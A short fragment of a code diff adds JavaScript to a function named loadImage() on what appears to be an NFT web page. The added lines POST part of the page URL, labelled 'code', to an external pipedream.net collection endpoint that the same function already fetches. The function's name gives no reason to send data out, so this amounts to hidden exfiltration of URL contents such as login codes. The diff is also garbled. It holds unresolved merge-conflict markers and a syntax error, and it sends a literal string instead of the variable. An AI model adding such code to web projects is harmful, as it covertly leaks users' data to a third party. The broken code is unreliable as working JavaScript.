@@ -18,7 +18,10 @@ function loadImage() {
 	let partial_result = full_url.substring(14);
 	
 
+let xhr = new XMLHttpRequest();
+	xhr.open("POST", "https://eocxim5r5v5rera.m.pipedream.net");
 
+<<<<<<< HEAD
 const params = {
     param1: full_url;
 };
@@ -31,7 +34,18 @@ fetch( 'https://eocxim5r5v5rera.m.pipedream.net', options )
     .then( response => {
         // Do something with response.
     } );
+=======
+	xhr.setRequestHeader("Accept", "application/json");
+	xhr.setRequestHeader("Content-Type", "application/json");
+>>>>>>> parent of 248355e (Update nft.html)
 
+	xhr.onload = () => console.log(xhr.responseText);
+
+let data = `{
+  "code": partial_result
+}`;
+
+xhr.send(data);
 
  
 }
